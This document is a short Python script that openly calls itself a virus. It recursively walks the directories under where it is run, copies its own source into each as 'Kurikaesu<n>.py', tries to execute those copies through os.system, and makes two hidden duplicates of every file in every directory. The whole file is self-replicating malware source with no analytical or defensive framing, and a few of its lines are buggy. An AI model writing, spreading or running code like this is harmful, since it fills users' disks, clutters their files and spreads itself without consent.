import os
import shutil 
import random


class Virus:
    
    def __init__(self, path=None, target_dir=None, repeat=None):
        self.path = path
        self.target_dir = []
        self.repeat = 2
        self.own_path = os.path.realpath(__file__)
        
    def list_directories(self,path):
        self.target_dir.append(path)
        current_dir = os.listdir(path)
        
        for file in current_dir:
            if not file.startswith('.'):
                # get the full path
                absolute_path = os.path.join(path, file)
                print(absolute_path)

                if os.path.isdir(absolute_path):
                    self.list_directories(absolute_path)
                else:
                    pass
   
    def new_virus(self):
        for directory in self.target_dir:
            n = random.randint(0,10)
            new_script="Kurikaesu"+str(n)+".py"
            destination = os.path.join(directory, new_script)
            shutil.copyfile(self.own_path, destination) #Copy the virus from the base virus file to a new destination
            os.system(new_script + " 1")
#Replcate   
    def replicate(self):
        for directory in self.target_dir:
            file_list_in_dir = os.listdir(directory)
            for file in file_list_in_dir:
                abs_path = os.path.join(directory, file)
                if not abs_path.startswith('.') and not os.path.isdir(abs_path):  #Ignore the files created by a virus
                    source = abs_path  #Assign the full file path to the variable source
                    for i in range(self.repeat): #This is the for loop to know how many copies of a file to be made, which it will know from the variable repeat initialized above in the program
                        destination = os.path.join(directory,("."+file+str(i)))
                        shutil.copyfile(source, destination)
                        
                        
    def Virus_action(self):
        self.list_directories(self.path)
        print(self.target_dir)
        self.new_virus()
        self.replicate()
        
        
                        
if __name__=="__main__":
    current_directory = os.path.abspath("") #Fetch the current_directory in which the Virus.py file is presently using the os.path.abspath
    Virus = Virus(path=current_directory) #Define the object Virus for class Virus and set the attribute path to current_directory
    Virus.Virus_action()